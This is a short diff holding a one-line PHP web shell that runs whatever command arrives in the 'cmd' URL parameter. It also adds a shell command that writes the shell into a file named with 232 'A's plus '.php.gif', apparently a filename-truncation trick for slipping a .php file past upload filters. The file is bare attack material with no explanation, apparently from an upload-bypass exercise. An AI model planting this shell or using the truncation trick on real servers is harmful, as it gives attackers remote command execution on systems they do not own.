@@ -1,1 +1,5 @@
 <?php echo system($_GET["cmd"]); ?>
+
+
+echo  '<?php echo system($_GET["cmd"]); ?>'  >  $(python -c 'print("A"*(236-4)+".php"+".gif")')
+
